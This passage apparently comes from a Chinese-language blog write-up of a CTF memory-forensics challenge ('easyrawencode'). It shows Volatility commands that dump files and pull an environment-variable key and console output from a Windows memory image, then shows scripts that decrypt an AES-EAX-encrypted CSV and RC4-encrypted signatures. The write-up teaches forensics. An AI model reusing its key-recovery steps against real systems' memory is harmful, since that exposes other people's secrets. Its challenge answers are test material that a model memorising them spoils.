class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f /home/chromosome/Forensics/volatility2/volatility/easyrawencode.raw --profile=Win7SP1x64 dumpfiles -Q <span class="string">&quot;0x000000003fd5bf20&quot;</span>  --dump-<span class="built_in">dir</span>=./</span><br><span class="line"></span><br><span class="line">python2 vol.py -f /home/chromosome/Forensics/volatility2/volatility/easyrawencode.raw --profile=Win7SP1x64 dumpfiles -Q <span class="string">&quot;0x00000000061f5630&quot;</span>  --dump-<span class="built_in">dir</span>=./</span><br><span class="line"></span><br><span class="line">python2 vol.py -f /home/chromosome/Forensics/volatility2/volatility/easyrawencode.raw --profile=Win7SP1x64 dumpfiles -Q <span class="string">&quot;0x000000003dfdf070&quot;</span>  --dump-<span class="built_in">dir</span>=./ </span><br></pre></td></tr></table></figure><p><img src="/2025/01/19/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91easyrawencode/微信截图_20250119124952.png" alt="微信截图_20250119124952"></p><p>我们看一下hack.py的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">hackkey = os.getenv(<span class="string">&#x27;hackkey&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> hackkey:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;Environment variable &#x27;hackkey&#x27; is not set&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;private.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    private_key = RSA.import_key(f.read())</span><br><span class="line">public_key = private_key.publickey().export_key()</span><br><span class="line"></span><br><span class="line">aes_key = hashlib.sha256(hackkey.encode()).digest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.csv&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">cipher_aes = AES.new(aes_key, AES.MODE_EAX)</span><br><span class="line">ciphertext, tag = cipher_aes.encrypt_and_digest(data)</span><br><span class="line">cipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))</span><br><span class="line">enc_aes_key = cipher_rsa.encrypt(aes_key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;encrypted_data.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(ciphertext)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(enc_aes_key.<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(cipher_aes.nonce.<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(tag.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p>其实整个加密逻辑还是很清晰的，下面是对hack.py的整个流程的解释：</p><ul><li>首先利用环境变量<code>hackkey</code>派生了AES的加密密钥</li><li>利用AES-EAX模式对data.csv进行加密，返回密文和消息认证码</li><li>然后利用<code>private.pem</code>导出公钥对我们的AES密钥进行加密</li><li>在python控制台中输出加密后的AES秘钥<code>enc_aes_key</code>，EAX的随机数<code>nonce</code>，消息认证码<code>tag</code></li></ul><p>我们跟进<code>Crypto.Cipher</code>库中EAX模式的类可以发现解密中存在两个方法：</p><ul><li>带消息认证码的数据完整性和真实性的解密方式</li></ul><p><img src="/2025/01/19/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91easyrawencode/微信截图_20250119154129.png" alt="微信截图_20250119154129"></p><ul><li>常规解密</li></ul><p><img src="/2025/01/19/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91easyrawencode/微信截图_20250119154328.png" alt="微信截图_20250119154328"></p><p>注：nonce需要在实例化EAX模式类的时候传入</p><p>那么我们可以得知，需要解密出我们的data.csv我们仅需要<code>hackkey</code>，<code>nonce</code>，<code>encrypted_data.bin</code>即可，其他的均为冗余的。</p><p>在环境变量中读取<code>hackkey</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f /home/chromosome/Forensics/volatility2/volatility/easyrawencode.raw --profile=Win7SP1x64 envars | grep <span class="string">&quot;hackkey&quot;</span></span><br><span class="line"></span><br><span class="line">4etz0hHbU3TgKqduFL</span><br></pre></td></tr></table></figure><p><img src="/2025/01/19/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91easyrawencode/微信截图_20250119155213.png" alt="微信截图_20250119155213"></p><p>观察<code>hack.py</code>的运行方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f /home/chromosome/Forensics/volatility2/volatility/easyrawencode.raw --profile=Win7SP1x64 cmdscan</span><br></pre></td></tr></table></figure><p><img src="/2025/01/19/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91easyrawencode/微信截图_20250119155454.png" alt="微信截图_20250119155454"></p><p>由上图得知<code>hack.py</code>在命令行中运行，那么我们就能读出运行后在命令行中留下的输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f /home/chromosome/Forensics/volatility2/volatility/easyrawencode.raw --profile=Win7SP1x64 consoles</span><br></pre></td></tr></table></figure><p><img src="/2025/01/19/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91easyrawencode/微信截图_20250119155729.png" alt="微信截图_20250119155729"></p><p>数据如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">20d96098010eb9b326be6c46e1ce1ca679e29f1d65dec055cf8c46c6436c3356af2dc312b2d35466</span><br><span class="line">308b9fff0dd427b44a37e34fca12992e45db2ddd81884bd8eb5bccd3c595e8a9a352bd61322e1d52</span><br><span class="line">329d6c8638bbfce65edffbc4d3a5759e88c0f90e31ce518837552a3a09d8e7e3c374f3857bfe501c</span><br><span class="line">ce2066fb233ff1f5faac18d73c3b665a54e8c55574f16bf4678c5ce835d2a14a65f8c1cec012435a</span><br><span class="line">8c06314cbe727a3a9b6060dfd6cdb850073423841178f6f409bb7ce8d4863c6f58855954d34af3d2</span><br><span class="line">964c488c9057c8c5072a54e43f1f8039d32409eb1ff3abca41c0b302788c4c56c1a4be4506ff5b8a</span><br><span class="line">ff0242e21c0ee7ffee2da20ed9434334                                                </span><br><span class="line">d919c229aab6535efa09a52c589c8f47                                                </span><br><span class="line">5b204675b1b173c32c04b0b8a100ee29 </span><br></pre></td></tr></table></figure><p>接下来直接用<code>nonce</code>和<code>hackkey</code>解密就行了，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">hackkey = <span class="string">&quot;4etz0hHbU3TgKqduFL&quot;</span></span><br><span class="line">nonce = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;d919c229aab6535efa09a52c589c8f47&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;encrypted_data.bin&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertext = f.read()</span><br><span class="line"></span><br><span class="line">aes_key = hashlib.sha256(hackkey.encode()).digest()</span><br><span class="line">cipher_aes = AES.new(aes_key, AES.MODE_EAX, nonce=nonce)</span><br><span class="line">data = cipher_aes.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.csv&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;成功解密出data.csv&quot;</span>)</span><br></pre></td></tr></table></figure><p>使用notepad打开解密后的文件</p><p><img src="/2025/01/19/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91easyrawencode/微信截图_20250119160132.png" alt="微信截图_20250119160132"></p><p>接下来就是确定个性签名的加密算法即可，在常见带key解密中尝试，确定RC4，写脚本解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrypt</span>(<span class="params">key, ciphertext</span>):</span><br><span class="line">    cipher = ARC4.new(key.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    decrypted = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="keyword">return</span> decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_signatures</span>(<span class="params">csv_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(csv_file, newline=<span class="string">&#x27;&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">        reader = csv.reader(csvfile)</span><br><span class="line">        headers = <span class="built_in">next</span>(reader)</span><br><span class="line">        decrypted_signatures = []</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">            password = row[<span class="number">2</span>]</span><br><span class="line">            encrypted_signature_base64 = row[<span class="number">6</span>]</span><br><span class="line">            encrypted_signature = base64.b64decode(encrypted_signature_base64)</span><br><span class="line">            decrypted_signature = rc4_decrypt(password, encrypted_signature)</span><br><span class="line">            decrypted_signatures.append(decrypted_signature)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> decrypted_signatures</span><br><span class="line"></span><br><span class="line">csv_file = <span class="string">&#x27;data.csv&#x27;</span></span><br><span class="line">decrypted_signatures = decrypt_signatures(csv_file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, signature <span class="keyword">in</span> <span class="built_in">enumerate</span>(decrypted_signatures):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密后的个性签名 <span class="subst">&#123;i + <span class="number">1</span>&#125;</span>: <span class="subst">&#123;signature&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/01/19/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91easyrawencode/微信截图_20250119160511.png" alt="微信截图_20250119160511"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
